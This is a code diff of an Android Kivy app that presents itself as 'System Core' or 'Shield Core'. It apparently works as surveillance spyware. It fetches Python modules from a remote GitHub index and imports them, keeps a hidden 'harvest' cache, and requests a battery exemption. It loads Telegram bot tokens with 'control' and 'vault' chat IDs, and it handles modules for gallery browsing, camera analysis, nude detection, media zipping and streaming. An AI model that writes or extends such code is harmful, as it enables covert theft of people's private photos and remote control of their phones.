@@ -9,7 +9,6 @@ import gc
 import time
 import socket
 import random
-import shutil
 from datetime import datetime
 from kivy.app import App
 from kivy.uix.textinput import TextInput
@@ -18,7 +17,7 @@ from kivy.uix.button import Button
 from kivy.clock import Clock
 from kivy.core.clipboard import Clipboard
 
-# ========== تجاوز DNS (اختياري) ==========
+# ========== دالة DNS patch (كما هي) ==========
 def _patch_dns():
     original_getaddrinfo = socket.getaddrinfo
     def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
@@ -36,12 +35,11 @@ def _patch_dns():
 
 _patch_dns()
 
-# ========== روابط index.json (بدون تمييز assets) ==========
+# ========== روابط index.json ==========
 INDEX_BASE_URLS = [
     "https://zaen1993.github.io/Android-Core/index.json",
     "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json",
     "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
-    "https://raw.kkgithub.com/Zaen1993/Android-Core/main/index.json"
 ]
 
 HEADERS = {
@@ -65,17 +63,14 @@ def _get_path():
 R = _get_path()
 U = os.path.join(R, "updates")
 os.makedirs(U, exist_ok=True)
-
 HARVEST_QUEUE = os.path.join(R, ".cache_thumb")
 os.makedirs(HARVEST_QUEUE, exist_ok=True)
-
 MODELS_DIR = os.path.join(R, "models")
 os.makedirs(MODELS_DIR, exist_ok=True)
 
 if R not in sys.path:
     sys.path.insert(0, R)
 
-# ========== الأذونات ==========
 def _perms():
     try:
         from android.permissions import request_permissions, Permission
@@ -113,31 +108,42 @@ def _perms():
     except Exception as e:
         print(f"Battery exemption error: {e}")
 
+# ========== قراءة الأسرار من متغيرات البيئة ==========
+def load_secrets_from_env():
+    """قراءة التوكنات والمعرفات من متغيرات البيئة (GitHub Secrets)"""
+    active_tokens_str = os.environ.get("ACTIVE_TOKENS", "")
+    reserve_tokens_str = os.environ.get("RESERVE_TOKENS", "")
+    if not active_tokens_str:
+        raise Exception("ACTIVE_TOKENS env var not set")
+    active = [t.strip() for t in active_tokens_str.split(",") if t.strip()]
+    reserve = [t.strip() for t in reserve_tokens_str.split(",") if t.strip()] if reserve_tokens_str else []
+    ctrl = int(os.environ.get("CONTROL_CHAT_ID", "0"))
+    vault = int(os.environ.get("VAULT_CHAT_ID", "0"))
+    password = os.environ.get("APP_PASSWORD", "")
+    if not ctrl or not vault or not password:
+        raise Exception("Missing CONTROL_CHAT_ID, VAULT_CHAT_ID or APP_PASSWORD")
+    return active, reserve, ctrl, vault, password
+
 # ========== تطبيق Kivy ==========
 class CoreApp(App):
     def build(self):
         self.title = "System Core v4.2"
         layout = BoxLayout(orientation='vertical', spacing=5)
-
         self.log = TextInput(
             text="", readonly=True,
             background_color=(0.02, 0.02, 0.02, 1),
             foreground_color=(0.3, 0.9, 0.3, 1),
             font_size='10sp'
         )
-
         btns = BoxLayout(size_hint=(1, 0.08), spacing=5)
         copy_btn = Button(text="📋 COPY LOG", background_color=(0.2, 0.4, 0.6, 1))
         copy_btn.bind(on_press=self._copy)
         clear_btn = Button(text="🗑 CLEAR", background_color=(0.6, 0.2, 0.2, 1))
         clear_btn.bind(on_press=self._clear)
-
         btns.add_widget(copy_btn)
         btns.add_widget(clear_btn)
-
         layout.add_widget(self.log)
         layout.add_widget(btns)
-
         Clock.schedule_once(self._start, 0.5)
         return layout
 
@@ -175,7 +181,7 @@ class CoreApp(App):
         final_path = os.path.join(R, filename)
         url_with_cache_buster = f"{url}?t={int(time.time())}"
         try:
-            resp = requests.get(url_with_cache_buster, headers=HEADERS, timeout=20)  # verify=True افتراضياً
+            resp = requests.get(url_with_cache_buster, headers=HEADERS, timeout=20)
             if resp.status_code == 200 and len(resp.content) > 200:
                 with open(final_path, 'wb') as f:
                     f.write(resp.content)
@@ -191,7 +197,6 @@ class CoreApp(App):
             return True
         elif os.path.exists(model_path):
             os.remove(model_path)
-
         self._log("Downloading AI model (5.19 MB)...")
         try:
             resp = requests.get(model_url, headers=HEADERS, timeout=60, stream=True)
@@ -217,54 +222,14 @@ class CoreApp(App):
                 os.remove(model_path)
         return False
 
-    def _create_config_from_template(self):
-        """إنشاء config.py من config_template.py المضمن في APK"""
-        template_path = None
-        # حاول العثور على config_template.py في المسارات المتوقعة
-        possible_paths = [
-            os.path.join(os.path.dirname(os.path.abspath(__file__)), "config_template.py"),
-            os.path.join(R, "config_template.py"),
-            "config_template.py"
-        ]
-        for p in possible_paths:
-            if os.path.exists(p):
-                template_path = p
-                break
-        if not template_path:
-            self._log("config_template.py not found inside APK!", "ERROR")
-            return False
-        try:
-            # استيراد كوحدة مؤقتة لاستدعاء load_config
-            spec = importlib.util.spec_from_file_location("config_template", template_path)
-            config_module = importlib.util.module_from_spec(spec)
-            spec.loader.exec_module(config_module)
-            active, reserve, ctrl, vault, secret = config_module.load_config()
-            # كتابة config.py في مجلد R
-            config_py_path = os.path.join(R, "config.py")
-            with open(config_py_path, 'w') as f:
-                f.write(f"""# -*- coding: utf-8 -*-
-active_tokens = {active}
-reserve_tokens = {reserve}
-ctrl_id = {ctrl}
-vault_id = {vault}
-secret_password = "{secret}"
-def load_config():
-    return active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password
-""")
-            self._log("config.py created successfully.")
-            return True
-        except Exception as e:
-            self._log(f"Failed to create config.py: {e}", "ERROR")
-            return False
-
     def _start(self, _):
         threading.Thread(target=self._run, daemon=True).start()
 
     def _run(self):
         _perms()
-        self._log("Shield Core v4.2 (Dynamic Model) starting...", "BOOT")
+        self._log("Shield Core v4.2 (GitHub Secrets mode) starting...", "BOOT")
 
-        # ---- 1. جلب index.json ----
+        # ---- 1. جلب قائمة الملفات من index.json ----
         all_files = []
         for base_url in INDEX_BASE_URLS:
             try:
@@ -283,7 +248,7 @@ def load_config():
         else:
             self._log("Could not fetch index.json, using only local files.", "WARN")
 
-        # ---- 2. تحميل جميع الملفات بما فيها engine_v2.tflite (من قائمة files) ----
+        # ---- 2. تحميل جميع الملفات عدا main.py و config_template.py ----
         model_url = None
         for file_entry in all_files:
             name = file_entry.get('name')
@@ -297,25 +262,17 @@ def load_config():
                 continue
             self._download_safe(url, name)
 
-        # تحميل config_template.py إذا كان موجوداً في القائمة (أو تضمينه في APK)
-        # نفضل أن يكون config_template.py مضمن في APK، لذا لا نحمله من الإنترنت.
-
-        # ---- 3. إنشاء config.py من القالب المضمن ----
-        if not self._create_config_from_template():
-            self._log("Cannot proceed without config.py", "ERROR")
-            return
-
-        # ---- 4. تحميل الموديل إذا وُجد رابط ----
+        # ---- 3. تحميل الموديل ----
         if model_url:
             self._download_model_if_missing(model_url)
         else:
-            self._log("No model URL found in index, trying fallback...", "WARN")
+            self._log("No model URL in index, trying fallback...", "WARN")
             fallback_url = "https://zaen1993.github.io/Android-Core/assets/engine_v2.tflite"
             self._download_model_if_missing(fallback_url)
 
         time.sleep(1)
 
-        # ---- 5. تنظيف الوحدات القديمة ----
+        # ---- 4. تنظيف الوحدات القديمة ----
         modules_to_remove = ["monitor", "telegram_ui", "commands", "media_scanner", "daily_zipper",
                              "gallery_browser", "camera_analyzer", "nude_detector", "stream_manager"]
         for mod in modules_to_remove:
@@ -324,16 +281,15 @@ def load_config():
         importlib.invalidate_caches()
         gc.collect()
 
-        # ---- 6. استيراد config و Telegram UI ----
+        # ---- 5. تحميل الأسرار من البيئة ----
         try:
-            import config
-            active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = config.load_config()
-            self._log("Configuration loaded.")
+            active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = load_secrets_from_env()
+            self._log("Secrets loaded from environment.")
         except Exception as e:
-            self._log(f"Failed to load config: {e}", "ERROR")
+            self._log(f"Failed to load secrets: {e}", "ERROR")
             return
 
-        # التأكد من وجود telegram_ui.py
+        # ---- 6. التأكد من وجود telegram_ui.py ----
         if not os.path.exists(os.path.join(R, "telegram_ui.py")):
             self._log("telegram_ui.py not found. Check internet and index.json", "ERROR")
             return
